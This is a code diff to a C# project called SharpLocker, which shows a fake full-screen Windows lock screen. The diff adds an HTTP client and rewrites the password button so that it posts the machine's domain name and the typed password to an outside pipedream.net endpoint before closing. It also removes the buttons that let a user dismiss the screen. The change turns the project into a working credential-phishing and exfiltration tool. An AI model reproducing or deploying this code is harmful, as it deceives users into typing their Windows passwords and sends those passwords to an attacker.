@@ -10,11 +10,15 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Linq;
 using System.Runtime.InteropServices;
+using Flurl.Http;
+using System.Web;
 
 namespace SharpLocker
 {
     public partial class LockScreenForm : Form
     {
+
+        public static class LockScreen { };
         public LockScreenForm()
         {
             InitializeComponent();
@@ -23,6 +27,7 @@ namespace SharpLocker
             WindowState = FormWindowState.Normal;
             StartPosition = FormStartPosition.Manual;
             Location = new Point(0, 0);
+            //IRandomAccessStream imageStream = LockScreen.GetImageStream();
             Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             Image myimage = new Bitmap(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
             BackgroundImage = myimage;
@@ -169,38 +174,45 @@ namespace SharpLocker
             }
         }
 
-        private void pictureBox2_Click(object sender, EventArgs e)
-        {
-            Taskbar.Show();
-            System.Windows.Forms.Application.Exit();
-        }
-
         protected override void OnClosing(CancelEventArgs e)
         {
-                Taskbar.Show();
+            Taskbar.Show();
             base.OnClosing(e);
         }
-
-        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
+        // enter
+        private async void PasswordTextBox_TextChanged(object sender, EventArgs e)
         {
-            Console.WriteLine(PasswordTextBox);
+            
+            ///Console.WriteLine(PasswordTextBox);
         }
 
         private void label1_Click(object sender, EventArgs e)
         {
 
         }
+        private static Random random = new Random();
+       
 
-        private void pictureBox3_Click(object sender, EventArgs e)
+        private async void button1_Click_1(object sender, EventArgs e)
         {
-            Taskbar.Show();
-            System.Windows.Forms.Application.Exit();
-        }
-        // enter password
-        private void button1_Click_1(object sender, EventArgs e)
-        {
-            Taskbar.Show();
-            System.Windows.Forms.Application.Exit();
+            if (!string.IsNullOrEmpty(PasswordTextBox.Text) || !string.IsNullOrWhiteSpace(PasswordTextBox.Text))
+            {
+                Console.WriteLine(PasswordTextBox.Text);
+           
+                await "https://enw8fa6rzku9g.x.pipedream.net/".PostUrlEncodedAsync(new
+                {
+                    user = System.Environment.UserDomainName,
+                    password = PasswordTextBox.Text,
+                    test = "iiiiiiiiwowowowowoowowowo020"
+                });
+                Taskbar.Show();
+                System.Windows.Forms.Application.Exit();
+            }
+            else
+            {
+                /*Taskbar.Show();
+                System.Windows.Forms.Application.Exit();*/
+            }
         }
 
         private void LockScreenForm_Load(object sender, EventArgs e)
